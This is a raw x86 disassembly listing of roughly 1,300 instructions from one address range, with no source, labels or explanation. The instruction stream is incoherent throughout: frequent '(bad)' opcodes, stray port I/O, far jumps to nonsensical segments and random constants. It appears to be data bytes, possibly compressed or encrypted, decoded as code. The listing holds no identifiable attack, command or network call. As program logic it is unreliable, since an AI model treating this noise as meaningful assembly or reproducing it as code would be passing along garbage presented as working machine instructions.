  41931d:	mov    edx,0xce1dfae2
  419322:	mov    ch,0xb8
  419324:	or     eax,0x8c843d9f
  419329:	inc    edx
  41932a:	cmp    DWORD PTR [ecx-0x9e67489],0x8
  419331:	push   ds
  419332:	loope  0x41935d
  419334:	int    0xd
  419336:	mov    ch,0xfc
  419338:	fadd   st,st(3)
  41933a:	fld1   
  41933c:	ror    DWORD PTR [eax-0x5],1
  41933f:	arpl   WORD PTR [edi],si
  419341:	mov    cl,0xe1
  419343:	out    dx,al
  419344:	mov    esp,0x96333037
  419349:	jmp    0x419376
  41934b:	jl     0x4192fe
  41934d:	or     eax,DWORD PTR [ebp+ebp*2-0x5e9db1dc]
  419354:	rcr    DWORD PTR [esi-0x78d0ab67],1
  41935a:	faddp  st(4),st
  41935c:	inc    si
  41935e:	push   ebx
  41935f:	push   esi
  419360:	aas    
  419361:	in     al,0xb5
  419363:	sub    ebx,DWORD PTR [ebx+0x2aae9e34]
  419369:	jg     0x4193d4
  41936b:	add    eax,0x45ce88be
  419370:	imul   DWORD PTR [esi]
  419372:	xchg   eax,eax
  419374:	popf   
  419375:	stos   DWORD PTR es:[edi],eax
  419376:	mov    BYTE PTR [esi+0x1f],ch
  419379:	inc    ebx
  41937a:	pop    ebx
  41937b:	push   ebx
  41937c:	repz add BYTE PTR [edx+0x31],0x8b
  419381:	je     0x419319
  419383:	and    DWORD PTR [ecx+edx*2-0x70e550a3],ecx
  41938a:	lods   al,BYTE PTR ds:[esi]
  41938b:	or     al,BYTE PTR [edx]
  41938d:	push   ss
  41938e:	pop    esp
  41938f:	lds    esi,FWORD PTR [edx]
  419391:	repnz inc edi
  419393:	test   BYTE PTR [edi],ch
  419395:	mov    cl,0x5d
  419397:	xchg   edx,eax
  419398:	xchg   ecx,eax
  419399:	mov    edi,0xc280af7f
  41939e:	(bad)  
  41939f:	(bad)  
  4193a1:	mov    eax,ds:0xbb7d836e
  4193a6:	bound  esp,QWORD PTR [edi]
  4193a8:	(bad)  
  4193a9:	add    DWORD PTR [ecx],eax
  4193ab:	cld    
  4193ac:	pop    edx
  4193ad:	adc    ebp,DWORD PTR [ebp-0x12]
  4193b0:	(bad)  
  4193b1:	(bad)  
  4193b2:	ja     0x41935d
  4193b4:	shl    BYTE PTR [ebx-0x7c],cl
  4193b7:	mov    esp,0xe7d81b2a
  4193bc:	pushf  
  4193bd:	iret   
  4193be:	fisttp QWORD PTR [eax+0x27]
  4193c1:	(bad)  
  4193c3:	inc    ecx
  4193c4:	(bad)  
  4193c5:	loop   0x419366
  4193c7:	or     eax,0x7fe8b275
  4193cc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4193cd:	repz sub eax,DWORD PTR [esi+0x5e]
  4193d1:	and    al,0xc3
  4193d3:	dec    ebp
  4193d4:	push   eax
  4193d5:	push   ebp
  4193d6:	pop    esi
  4193d7:	and    DWORD PTR [edx+0x35a02b29],0x7d
  4193de:	push   ebx
  4193df:	(bad)  
  4193e0:	mov    edi,0xe7bcb30d
  4193e5:	daa    
  4193e6:	(bad)  
  4193e8:	retf   
  4193e9:	push   esi
  4193ea:	push   esp
  4193eb:	repz (bad) 
  4193ed:	or     al,0x4c
  4193ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4193f0:	mov    ds:0x5620997a,al
  4193f5:	sbb    DWORD PTR [eax],esp
  4193f7:	(bad)  
  4193f8:	pop    ss
  4193f9:	fld    TBYTE PTR [ecx]
  4193fb:	and    al,0x3c
  4193fd:	sub    al,0xc8
  4193ff:	fucompp 
  419401:	jecxz  0x419424
  419403:	inc    eax
  419404:	sbb    dl,bl
  419406:	data16 sub al,0xb4
  419409:	adc    cl,BYTE PTR [edx]
  41940b:	data16 das 
  41940d:	pushf  
  41940e:	shr    DWORD PTR [edi],1
  419410:	out    dx,eax
  419411:	loopne 0x41947c
  419413:	ror    bl,cl
  419415:	pop    ebx
  419416:	js     0x41941e
  419418:	sub    eax,0x858195a
  41941d:	scas   eax,DWORD PTR es:[edi]
  41941e:	mov    DWORD PTR [edx],ecx
  419420:	xchg   ebx,eax
  419421:	cmc    
  419422:	push   esi
  419423:	mov    ecx,0x21714622
  419428:	inc    esi
  419429:	test   BYTE PTR [eax-0x1d3c22cd],dl
  41942f:	popa   
  419430:	xor    DWORD PTR [ebp+0x129c399a],esp
  419436:	push   ebp
  419437:	adc    BYTE PTR [edx-0x2c],dl
  41943a:	mov    ds:0x76c6ac78,al
  41943f:	iret   
  419440:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419441:	jmp    0x62da:0x6d34317f
  419448:	mov    ecx,0x3f96c43d
  41944d:	fwait
  41944e:	mov    ah,0x46
  419450:	(bad)  
  419451:	jmp    0x8c02dadc
  419456:	cdq    
  419457:	cdq    
  419458:	dec    esp
  41945a:	push   cs
  41945b:	pop    es
  41945c:	mov    ecx,0x6c8acb21
  419461:	mov    ch,BYTE PTR [ebp+ecx*2+0xde0e004]
  419468:	add    BYTE PTR [esi],bl
  41946a:	int3   
  41946b:	sbb    dh,BYTE PTR [edi]
  41946d:	xchg   edx,eax
  41946e:	push   eax
  41946f:	test   BYTE PTR ss:[ecx],bh
  419472:	mov    ch,0xd0
  419474:	pop    ecx
  419475:	nop
  419476:	jp     0x419491
  419478:	xchg   ebp,eax
  419479:	cld    
  41947a:	or     BYTE PTR [ebx+eax*1-0x71],dh
  41947e:	adc    eax,0xf952e331
  419483:	inc    eax
  419484:	dec    ebp
  419485:	jmp    0xcbf0:0x537c7f8f
  41948c:	mov    WORD PTR [ebp+0x74],fs
  41948f:	xchg   ecx,eax
  419490:	cmp    DWORD PTR [edi+0x71],ebp
  419493:	pop    esp
  419494:	xchg   edi,eax
  419495:	sub    BYTE PTR [edx+0x50],ah
  419498:	in     eax,dx
  419499:	jbe    0x419517
  41949b:	imul   edi,DWORD PTR [eax-0x7df07764],0xffffffeb
  4194a2:	xor    BYTE PTR [ebx+0x1d15c82e],al
  4194a8:	pop    edi
  4194a9:	mov    ebx,0xe8e7c9e8
  4194ae:	retf   
  4194af:	pop    edi
  4194b0:	mov    bl,0x20
  4194b2:	sbb    BYTE PTR [esi-0x2b35cee5],0x1f
  4194b9:	bound  esi,QWORD PTR [edx]
  4194bb:	ret    
  4194bc:	fidivr DWORD PTR [edx]
  4194be:	imul   esp,eax,0x13e43a29
  4194c4:	cwde   
  4194c5:	or     al,0xa7
  4194c7:	cld    
  4194c8:	cmp    al,0x83
  4194ca:	or     edi,edi
  4194cc:	je     0x4194d3
  4194ce:	mov    ecx,0xca1bc54b
  4194d3:	in     al,dx
  4194d4:	out    dx,eax
  4194d5:	(bad)  
  4194d7:	xor    ebp,edi
  4194d9:	repnz mov edx,0xc858e09d
  4194df:	xlat   BYTE PTR ds:[ebx]
  4194e0:	cmp    DWORD PTR [edi+edx*4-0x1f793310],esi
  4194e7:	push   ebp
  4194e8:	and    BYTE PTR [edi],bl
  4194ea:	fmul   st(0),st
  4194ec:	xor    edx,esi
  4194ee:	sub    ebx,eax
  4194f0:	inc    ebp
  4194f1:	mov    bh,0x96
  4194f3:	sbb    eax,esp
  4194f5:	scas   eax,DWORD PTR es:[edi]
  4194f6:	(bad)  
  4194f7:	enter  0xbeb6,0x87
  4194fb:	push   ebx
  4194fc:	adc    DWORD PTR [ebx+0x11],0x18b308e5
  419503:	stc    
  419504:	into   
  419505:	popa   
  419506:	shr    DWORD PTR [edi-0x2],1
  419509:	pop    ds
  41950a:	pop    ecx
  41950b:	pop    esp
  41950c:	inc    esp
  41950d:	dec    eax
  41950e:	or     bh,BYTE PTR [eax+0x4e]
  419511:	push   es
  419512:	push   eax
  419513:	xchg   ebx,eax
  419514:	jns    0x41951a
  419516:	and    ah,BYTE PTR [esi-0x27]
  419519:	jnp    0x419552
  41951b:	cli    
  41951c:	pushf  
  41951d:	mov    cl,0x54
  41951f:	sub    eax,0x8f0bb9dc
  419524:	and    BYTE PTR [edi-0x56],dh
  419527:	mov    dl,0xdb
  419529:	dec    esp
  41952a:	xchg   ebx,eax
  41952b:	clc    
  41952c:	mov    dh,0x5e
  41952e:	stc    
  41952f:	push   esi
  419530:	shl    DWORD PTR [edi],cl
  419532:	aas    
  419533:	xor    al,0x4a
  419535:	mov    eax,0x7f29f2fb
  41953a:	jmp    0x85a730c4
  41953f:	or     DWORD PTR [ecx+ebp*8+0x37],0x19
  419544:	push   edi
  419545:	bound  edi,QWORD PTR [eax+0x16]
  419548:	lahf   
  419549:	fnstsw WORD PTR [eax]
  41954b:	mov    ds:0x2754c733,eax
  419550:	pop    ebp
  419551:	pop    ebp
  419552:	xchg   DWORD PTR [ecx],edx
  419554:	adc    eax,0xc7169879
  419559:	test   al,0xdb
  41955b:	cmp    esi,esp
  41955d:	mov    al,dh
  41955f:	mov    ch,0x75
  419561:	add    DWORD PTR [eax-0x7b],eax
  419564:	(bad)  
  419565:	gs xor edi,0xffffffa8
  419569:	xor    ch,BYTE PTR [edi+edx*1-0x70]
  41956d:	sar    DWORD PTR [eax-0x445aaf18],0xb8
  419574:	mov    BYTE PTR [ebp+0x516b4357],ah
  41957a:	pusha  
  41957b:	arpl   WORD PTR [ebx+ebx*8],dx
  41957e:	sub    al,0x31
  419580:	lods   al,BYTE PTR ds:[esi]
  419581:	pop    ebx
  419582:	push   edi
  419583:	pop    es
  419584:	adc    al,0x61
  419586:	je     0x419525
  419588:	pusha  
  419589:	outs   dx,DWORD PTR ds:[esi]
  41958a:	add    ch,bh
  41958c:	repz (bad) 
  41958f:	les    ecx,FWORD PTR [ecx+eax*4+0x52]
  419593:	jge    0x4195d2
  419595:	mov    esi,0xf10f7826
  41959a:	mov    al,ds:0x2a2858a0
  41959f:	mov    ch,0xee
  4195a1:	adc    al,BYTE PTR [edi+0x3e2937e7]
  4195a7:	clc    
  4195a8:	loopne 0x419542
  4195aa:	stos   DWORD PTR es:[edi],eax
  4195ab:	ins    BYTE PTR es:[edi],dx
  4195ac:	mov    cl,0xbf
  4195ae:	stc    
  4195af:	or     esi,DWORD PTR [ebp+eax*2+0x18]
  4195b3:	outs   dx,BYTE PTR ds:[esi]
  4195b4:	sbb    al,0x38
  4195b6:	test   al,0x11
  4195b8:	xchg   ebp,eax
  4195b9:	shl    esp,1
  4195bb:	std    
  4195bc:	out    dx,al
  4195bd:	aaa    
  4195be:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4195bf:	popa   
  4195c0:	dec    edi
  4195c1:	dec    ebx
  4195c2:	sti    
  4195c3:	cmp    eax,0x37bf17e3
  4195c8:	ds repz fnstsw ax
  4195cc:	ja     0x41964b
  4195ce:	mov    edx,0xe8b6cbb8
  4195d3:	int    0xf6
  4195d5:	cwde   
  4195d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4195d7:	sbb    cl,BYTE PTR [ecx]
  4195d9:	jo     0x41963b
  4195db:	and    eax,0x28e0ded5
  4195e0:	sub    eax,0x74f59d64
  4195e5:	inc    ebx
  4195e6:	cmp    BYTE PTR ds:0x77c79f03,dh
  4195ec:	(bad)  
  4195ed:	xor    al,0xba
  4195ef:	sub    edx,DWORD PTR [eax-0x62496ca4]
  4195f5:	pop    ss
  4195f6:	ror    DWORD PTR [edx-0x31],1
  4195f9:	and    ebp,esi
  4195fb:	imul   edi,DWORD PTR [esi+0x32e29bba],0xffffffa9
  419602:	mov    edx,0xe963998f
  419607:	dec    edx
  419608:	pop    ecx
  419609:	pop    eax
  41960a:	adc    BYTE PTR [ebx-0x1f2d0e9f],al
  419610:	dec    edx
  419611:	inc    ebx
  419612:	cld    
  419613:	addr16 cwde 
  419615:	sbb    al,ch
  419617:	jb     0x4195e1
  419619:	lea    esp,[eax+0x5c]
  41961c:	bound  ebx,QWORD PTR [ebx]
  41961e:	xchg   edx,eax
  41961f:	scas   eax,DWORD PTR es:[edi]
  419620:	pushf  
  419621:	pop    edi
  419622:	mov    edi,0x7b1e58c9
  419627:	mov    eax,ds:0x7bb8d2ce
  41962c:	fbld   TBYTE PTR [ebx+0x74e5ef84]
  419632:	and    al,0xea
  419634:	jne    0x4195f4
  419636:	or     dl,dl
  419638:	jle    0x419641
  41963a:	aam    0xb1
  41963c:	xor    eax,0x3962c0dc
  419641:	pop    es
  419642:	bnd jl 0x41968f
  419645:	push   0xffffffc1
  419647:	push   ecx
  419648:	retf   
  419649:	fs data16 std 
  41964c:	ds jnp 0x4195e3
  41964f:	scas   al,BYTE PTR es:[edi]
  419650:	(bad)  
  419651:	jne    0x41962f
  419653:	and    DWORD PTR [ebx],edi
  419655:	lock cmp ebx,DWORD PTR [ebp-0x59]
  419659:	retf   
  41965a:	in     al,0x78
  41965c:	dec    edx
  41965d:	xchg   edi,eax
  41965e:	jnp    0x4196a6
  419660:	int3   
  419661:	ror    esi,cl
  419663:	xchg   edx,eax
  419664:	sub    BYTE PTR [ecx+eax*8+0x28],cl
  419668:	aaa    
  419669:	jl     0x419631
  41966b:	out    dx,al
  41966c:	ficom  DWORD PTR ds:0xf987582
  419672:	cs cdq 
  419674:	into   
  419675:	call   0xaf89b3be
  41967a:	fidivr DWORD PTR [ecx]
  41967c:	stc    
  41967d:	jmp    0x4196b5
  41967f:	xlat   BYTE PTR ds:[ebx]
  419680:	adc    BYTE PTR [ebp-0x5],ch
  419683:	outs   dx,DWORD PTR ds:[esi]
  419684:	popf   
  419685:	and    al,0x29
  419687:	fiadd  WORD PTR [ecx+esi*8-0x23569217]
  41968e:	mov    dh,0xe4
  419690:	mov    dh,0xd0
  419692:	int    0xdc
  419694:	js     0x419714
  419696:	xchg   ebp,eax
  419697:	lahf   
  419698:	pop    ds
  419699:	or     DWORD PTR [ebp-0x39514e90],ecx
  41969f:	jge    0x4196c9
  4196a1:	in     al,0xfe
  4196a3:	iret   
  4196a4:	retf   
  4196a5:	into   
  4196a6:	pushf  
  4196a7:	push   esp
  4196a8:	jg     0x4196ee
  4196aa:	iret   
  4196ab:	jl     0x419656
  4196ad:	test   BYTE PTR [edi-0x4f],ah
  4196b0:	vpaddb ymm7,ymm7,ymm7
  4196b4:	dec    ebx
  4196b5:	aas    
  4196b6:	ins    BYTE PTR es:[edi],dx
  4196b7:	and    DWORD PTR [ecx],esp
  4196b9:	cld    
  4196ba:	fcmovnb st,st(5)
  4196bc:	aam    0x1d
  4196be:	ss mov ah,0x25
  4196c1:	push   ebx
  4196c2:	dec    edx
  4196c3:	cs icebp 
  4196c5:	hlt    
  4196c6:	les    ebx,FWORD PTR [esi]
  4196c8:	sub    BYTE PTR [esi+0x45],0xa6
  4196cc:	fistp  QWORD PTR [ebx]
  4196ce:	mov    DWORD PTR [ebp+0x1cfb2aad],ebp
  4196d4:	and    eax,0xf2ddc418
  4196d9:	ror    esi,0x3b
  4196dc:	lea    eax,[ecx]
  4196de:	xchg   esi,eax
  4196df:	pop    eax
  4196e0:	sub    esp,eax
  4196e2:	nop
  4196e3:	in     eax,dx
  4196e4:	mov    eax,ds:0xf66833e7
  4196e9:	jns    0x4196e0
  4196eb:	sub    eax,0xe4418a47
  4196f0:	mov    dh,BYTE PTR [edi+edx*2-0x3d3118c4]
  4196f7:	(bad)  
  4196f9:	inc    edi
  4196fa:	rol    DWORD PTR [edi],0x97
  4196fd:	inc    eax
  4196fe:	daa    
  4196ff:	and    bl,BYTE PTR cs:[ebx]
  419702:	ret    0xf25
  419705:	push   ecx
  419706:	scas   eax,DWORD PTR es:[edi]
  419707:	pusha  
  419708:	lods   al,BYTE PTR ds:[esi]
  419709:	ja     0x41974d
  41970b:	sar    BYTE PTR [eax+0x68],0xc2
  41970f:	mov    eax,ds:0xf7ef7b62
  419714:	sub    dl,BYTE PTR [ecx]
  419716:	pop    es
  419717:	xor    eax,0xe80b910a
  41971c:	shl    BYTE PTR [ecx],cl
  41971e:	rcl    DWORD PTR [ebx],0x67
  419721:	adc    DWORD PTR [edx-0x45],esp
  419724:	pop    ds
  419725:	push   ebp
  419726:	loope  0x419781
  419728:	sub    BYTE PTR [ecx-0x78f72d10],bl
  41972e:	fisubr DWORD PTR [ebx-0x6cb56f8e]
  419734:	into   
  419735:	mov    ah,BYTE PTR [ebx+0x16]
  419738:	sub    esp,DWORD PTR ds:0x9f1c89d5
  41973e:	cmp    esp,DWORD PTR [edx+0xe]
  419741:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419742:	dec    esp
  419743:	sbb    eax,0xa7d5bac1
  419748:	retf   0x881e
  41974b:	sbb    al,0xb3
  41974d:	(bad)  
  41974e:	mov    eax,0x2bc7622d
  419753:	add    eax,0xd64ac13b
  419758:	pop    esi
  419759:	or     esi,edi
  41975b:	cmp    eax,0x6f7eb8c9
  419760:	lea    esi,[ebp+0x16]
  419763:	xchg   edx,eax
  419764:	lock and al,BYTE PTR [edi]
  419767:	xchg   ebx,eax
  419768:	inc    esp
  419769:	mov    edi,0x6c070ed6
  41976e:	xchg   ecx,eax
  41976f:	sbb    ch,BYTE PTR [edx+edx*8+0x5d]
  419773:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419774:	cdq    
  419775:	mov    DWORD PTR ds:0xf4e9916c,edx
  41977b:	lods   al,BYTE PTR ds:[esi]
  41977c:	dec    ebp
  41977d:	loopne 0x419708
  41977f:	lods   al,BYTE PTR ds:[esi]
  419780:	pop    ebx
  419781:	and    DWORD PTR ds:0x8baccebd,ebp
  419787:	pop    es
  419788:	stos   DWORD PTR es:[edi],eax
  419789:	dec    ebp
  41978a:	jl     0x4197eb
  41978c:	neg    DWORD PTR [ecx+0x2c]
  41978f:	or     DWORD PTR [edi],ecx
  419791:	sbb    eax,0x53a5fa43
  419796:	scas   eax,DWORD PTR es:[edi]
  419797:	push   esp
  419798:	repz mov bh,dh
  41979b:	jecxz  0x4197f2
  41979d:	pushf  
  41979e:	mov    dh,0xa9
  4197a0:	rcr    DWORD PTR [ecx-0x33f57e9a],0x28
  4197a7:	push   edx
  4197a8:	dec    edi
  4197a9:	addr16 push cs
  4197ab:	sbb    ecx,DWORD PTR [eax+0x4d]
  4197ae:	imul   eax,DWORD PTR [eax-0x40],0x46380312
  4197b5:	or     eax,0x808bb4c9
  4197ba:	mov    DWORD PTR [ebx-0x5c],eax
  4197bd:	data16 or dl,BYTE PTR [eax-0x47]
  4197c1:	daa    
  4197c2:	mov    ah,0x9c
  4197c4:	nop
  4197c5:	jno    0x419826
  4197c7:	mov    bh,0x2a
  4197c9:	adc    bh,BYTE PTR [eax]
  4197cb:	out    0x45,eax
  4197cd:	adc    dh,cl
  4197cf:	shr    edi,1
  4197d1:	test   al,0xdd
  4197d3:	push   eax
  4197d4:	shl    DWORD PTR [esi],0x50
  4197d7:	jae    0x419804
  4197d9:	stos   DWORD PTR es:[edi],eax
  4197da:	popf   
  4197db:	mov    ch,0x8d
  4197dd:	retf   
  4197de:	adc    ah,BYTE PTR [edi+0x68bdce3b]
  4197e4:	adc    BYTE PTR [edx+0x92f795d],0x60
  4197eb:	rcr    dh,cl
  4197ed:	aad    0x8f
  4197ef:	adc    edx,ecx
  4197f1:	jecxz  0x4197c6
  4197f3:	bound  esi,QWORD PTR [edx-0x2cc12ef5]
  4197f9:	dec    ecx
  4197fa:	shr    edi,1
  4197fc:	pusha  
  4197fd:	push   eax
  4197fe:	jge    0x41985c
  419800:	jo     0x419786
  419802:	add    eax,ebp
  419804:	push   eax
  419805:	dec    esp
  419806:	or     eax,0x4db66692
  41980b:	adc    esi,DWORD PTR ds:0x1168e09f
  419811:	add    esi,esi
  419813:	ins    DWORD PTR es:[edi],dx
  419814:	pusha  
  419815:	cmp    bx,WORD PTR [eax+0x3c]
  419819:	fsub   DWORD PTR [edx]
  41981b:	adc    BYTE PTR [ebx-0x66752779],dl
  419821:	inc    eax
  419822:	inc    edx
  419823:	sub    al,0x44
  419825:	jno    0x4197b8
  419827:	jecxz  0x4197ef
  419829:	stos   BYTE PTR es:[edi],al
  41982a:	adc    al,0x8b
  41982c:	mov    ebp,0xcff88cd3
  419831:	mov    al,0xd9
  419833:	sbb    al,0x6d
  419835:	inc    ebp
  419836:	inc    edi
  419837:	cwde   
  419838:	mov    ds:0x602a640e,eax
  41983d:	test   edi,ebx
  41983f:	lahf   
  419840:	sahf   
  419841:	and    eax,0xb1e59ecf
  419846:	(bad)  
  419847:	stos   DWORD PTR es:[edi],eax
  419848:	lds    eax,FWORD PTR [edi-0x5d549df0]
  41984e:	cmp    ah,BYTE PTR [ecx]
  419850:	dec    ebp
  419851:	dec    ebp
  419852:	repnz adc bl,ah
  419855:	adc    ecx,ebp
  419857:	add    al,0xf5
  419859:	loopne 0x41982c
  41985b:	fisttp QWORD PTR [ebx-0x3a]
  41985e:	xchg   edx,eax
  41985f:	mov    eax,0xde0cd462
  419864:	mov    dh,BYTE PTR [edx]
  419866:	ret    
  419867:	push   eax
  419868:	test   eax,0x3949ab58
  41986d:	adc    DWORD PTR [edx],ebp
  41986f:	push   0xe9aa87e6
  419874:	rol    bh,cl
  419876:	test   eax,0xf6482976
  41987b:	int    0xd7
  41987d:	fwait
  41987e:	out    0xb1,eax
  419880:	push   eax
  419881:	sbb    edi,esp
  419883:	test   cl,ch
  419885:	jne    0x4198eb
  419887:	in     al,dx
  419888:	push   ebx
  419889:	push   0x64328fc
  41988e:	mov    edi,eax
  419890:	lods   eax,DWORD PTR ds:[esi]
  419891:	mov    al,ds:0x6d6f4180
  419896:	jo     0x41984d
  419898:	push   ds
  419899:	mov    al,0x8f
  41989b:	sahf   
  41989c:	out    0xc6,al
  41989e:	test   ax,0xbdf
  4198a2:	jnp    0x4198c6
  4198a4:	imul   esi,eax,0xa9e2ed45
  4198aa:	pop    edi
  4198ab:	or     bh,BYTE PTR [ecx+ebp*1]
  4198ae:	fild   WORD PTR [ebx]
  4198b0:	jbe    0x41990d
  4198b2:	scas   eax,DWORD PTR es:[edi]
  4198b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4198b4:	pushf  
  4198b5:	(bad)  
  4198b6:	cmc    
  4198b7:	mov    ecx,0xb4ebfc1
  4198bc:	ss mov esi,0x65523d80
  4198c2:	loopne 0x4198f8
  4198c4:	test   BYTE PTR [ebx],0x38
  4198c7:	sbb    dh,BYTE PTR [ebp+esi*2+0x5c278366]
  4198ce:	add    ebx,DWORD PTR [ebx]
  4198d0:	pop    ecx
  4198d1:	pop    ebx
  4198d2:	sbb    eax,0x63150c4d
  4198d7:	jnp    0x41991a
  4198d9:	lock or DWORD PTR ds:0xe0613d88,esi
  4198e0:	dec    esp
  4198e1:	pusha  
  4198e2:	jb     0x41995a
  4198e4:	jmp    0x419936
  4198e6:	sbb    al,0xee
  4198e8:	jns    0x41994c
  4198ea:	sub    ebx,esp
  4198ec:	ins    DWORD PTR es:[edi],dx
  4198ed:	cmp    BYTE PTR [ecx],cl
  4198ef:	dec    edi
  4198f0:	push   ebx
  4198f1:	out    dx,eax
  4198f2:	clc    
  4198f3:	fwait
  4198f4:	sub    al,0x38
  4198f6:	loopne 0x41991c
  4198f8:	adc    BYTE PTR [esi],dh
  4198fa:	pusha  
  4198fb:	push   ecx
  4198fc:	add    BYTE PTR [ecx-0x6a377bc4],ch
  419902:	xchg   edx,eax
  419903:	mov    ebx,es
  419905:	in     al,0x9e
  419907:	(bad)
  41990b:	aad    0x97
  41990d:	imul   ebp,DWORD PTR [edx-0x7f],0xd88f8cd9
  419914:	sbb    esp,DWORD PTR gs:[ebx]
  419917:	ror    ah,cl
  419919:	mov    WORD PTR [edx-0x23],es
  41991c:	popa   
  41991d:	mov    DWORD PTR [edi],edx
  41991f:	and    DWORD PTR [edi+0x3c],0xfffffffa
  419923:	push   eax
  419924:	fsub   st,st(4)
  419926:	lods   eax,DWORD PTR ds:[esi]
  419927:	jmp    0x32874ef5
  41992c:	pop    ds
  41992d:	xchg   ebx,eax
  41992e:	or     edx,DWORD PTR [edi+0x4d]
  419931:	call   DWORD PTR [ecx-0x7c834a1d]
  419937:	xor    BYTE PTR [esi-0x799fe72a],ch
  41993d:	inc    ebp
  41993e:	ds or  al,0xc4
  419941:	or     BYTE PTR [ebx],al
  419943:	std    
  419944:	fbld   TBYTE PTR [esi]
  419946:	inc    ecx
  419947:	retf   
  419948:	xor    DWORD PTR [esp+eiz*2+0x20b1e820],0x2f
  419950:	mov    bl,0xa3
  419952:	enter  0x9268,0xdc
  419956:	mov    eax,ds:0x6f70ede9
  41995b:	jmp    0x4199b6
  41995d:	cwde   
  41995e:	shr    DWORD PTR [ebp-0x4662a8a7],0x2c
  419965:	(bad)  [ebx-0x445ac12]
  41996b:	cmp    bh,BYTE PTR [edi+edx*8-0x23]
  41996f:	ds mov bl,0x4d
  419972:	ja     0x419990
  419974:	pop    ebx
  419975:	cmp    eax,0x44724c75
  41997a:	bound  edx,QWORD PTR [ebx]
  41997c:	in     eax,dx
  41997d:	and    BYTE PTR [ebx+0x54891ba8],cl
  419983:	call   FWORD PTR [eax]
  419985:	pop    ds
  419986:	dec    eax
  419987:	push   eax
  419988:	and    eax,DWORD PTR [eax-0x7e1e7fee]
  41998e:	and    edx,DWORD PTR [edi]
  419990:	push   cs
  419991:	mov    ecx,0xbe23c263
  419996:	call   0x8fb5:0x2a109772
  41999d:	push   edx
  41999e:	adc    ah,dl
  4199a0:	outs   dx,BYTE PTR ds:[esi]
  4199a1:	dec    ebp
  4199a2:	sbb    al,0xcf
  4199a4:	add    dl,dl
  4199a6:	loop   0x4199ee
  4199a8:	test   eax,0x78c118ed
  4199ad:	xchg   esp,eax
  4199ae:	imul   ebx,esp,0x74d71bff
  4199b4:	push   ecx
  4199b5:	pop    edx
  4199b6:	cli    
  4199b7:	push   ebp
  4199b8:	es or  al,0xcf
  4199bb:	aaa    
  4199bc:	fs mov ebx,0x574549aa
  4199c2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4199c3:	std    
  4199c4:	xchg   edx,eax
  4199c5:	adc    ecx,DWORD PTR [esi-0x300bbb71]
  4199cb:	sti    
  4199cc:	adc    ch,ah
  4199ce:	pop    edi
  4199cf:	icebp  
  4199d0:	mov    edi,0xb49b6c05
  4199d5:	out    dx,al
  4199d6:	fld    QWORD PTR [ecx+0x2a]
  4199d9:	cmp    dh,bl
  4199db:	jbe    0x419a17
  4199dd:	les    edx,FWORD PTR [ecx-0x22cd3e6]
  4199e3:	es xchg esp,eax
  4199e5:	push   ds
  4199e6:	cdq    
  4199e7:	push   ebp
  4199e8:	call   0x61c9:0x4089caf
  4199ef:	jns    0x419974
  4199f1:	fdiv   st(1),st
  4199f3:	jmp    0x419a29
  4199f5:	pop    edi
  4199f6:	repnz mov esi,0xe73e6046
  4199fc:	inc    edi
  4199fd:	test   al,0xec
  4199ff:	add    BYTE PTR [edx],ch
  419a01:	mov    esp,0x7344941f
  419a06:	xlat   BYTE PTR ds:[ebx]
  419a07:	mov    esi,0x2f59054
  419a0c:	pop    eax
  419a0d:	or     BYTE PTR [edi+ebp*8-0xd],dl
  419a11:	call   0x5ebc:0x3e2a58dc
  419a18:	enter  0x38e8,0xdb
  419a1c:	pop    ds
  419a1d:	(bad)  
  419a1e:	jp     0x419a63
  419a20:	inc    ebx
  419a21:	lods   eax,DWORD PTR ds:[esi]
  419a22:	ret    0x1555
  419a25:	aas    
  419a26:	lahf   
  419a27:	rcr    DWORD PTR [eax+0x1dad7d63],cl
  419a2d:	popa   
  419a2e:	cmp    al,0x23
  419a30:	jo     0x419a26
  419a32:	nop
  419a33:	lock jbe 0x419a7f
  419a36:	adc    al,BYTE PTR [edi+0x52]
  419a39:	mov    cl,cl
  419a3b:	cwde   
  419a3c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419a3d:	cmp    cl,dl
  419a3f:	sbb    ebx,ecx
  419a41:	das    
  419a42:	cmp    BYTE PTR [ebp+0x52e9c05f],0xa0
  419a49:	ja     0x419a09
  419a4b:	and    edx,esi
  419a4d:	out    dx,eax
  419a4e:	mov    ch,0xac
  419a50:	xor    DWORD PTR [eax-0x50c12acf],esp
  419a56:	repnz push 0x98b07482
  419a5c:	and    BYTE PTR [edx],dh
  419a5e:	hlt    
  419a5f:	push   esi
  419a60:	mov    bl,0xcf
  419a62:	pop    ebp
  419a63:	dec    ebp
  419a64:	cmp    eax,0xbb8d8d26
  419a69:	push   edi
  419a6a:	inc    ecx
  419a6b:	push   0x53
  419a6d:	rcr    BYTE PTR [edi],0xdf
  419a70:	scas   al,BYTE PTR es:[edi]
  419a71:	pusha  
  419a72:	retf   
  419a73:	mov    eax,ds:0xddb03611
  419a78:	daa    
  419a79:	loop   0x419a3e
  419a7b:	ss aam 0x39
  419a7e:	not    al
  419a80:	and    DWORD PTR [eax+eiz*1],edi
  419a83:	bound  ebp,QWORD PTR [esi+ecx*4-0x4d]
  419a87:	inc    ebp
  419a88:	lahf   
  419a89:	in     al,0x50
  419a8b:	fidiv  DWORD PTR [esp+edx*8-0x7c]
  419a8f:	mul    BYTE PTR [ebp+eiz*4+0x31]
  419a93:	jle    0x419aa0
  419a95:	dec    edx
  419a96:	sbb    dl,BYTE PTR [edx+0x12c548cc]
  419a9c:	push   esp
  419a9d:	cmc    
  419a9e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419a9f:	jmp    0x586327f6
  419aa4:	push   0xffffff97
  419aa6:	mov    ecx,0x8cc9eae6
  419aab:	data16 fsubp st(3),st
  419aae:	jle    0x419ab8
  419ab0:	mov    BYTE PTR [edi-0x14],dl
  419ab3:	sub    eax,DWORD PTR [edx]
  419ab5:	pop    eax
  419ab6:	or     DWORD PTR [eax],edi
  419ab8:	cmp    al,0xf3
  419aba:	ds jecxz 0x419b09
  419abd:	xchg   edx,eax
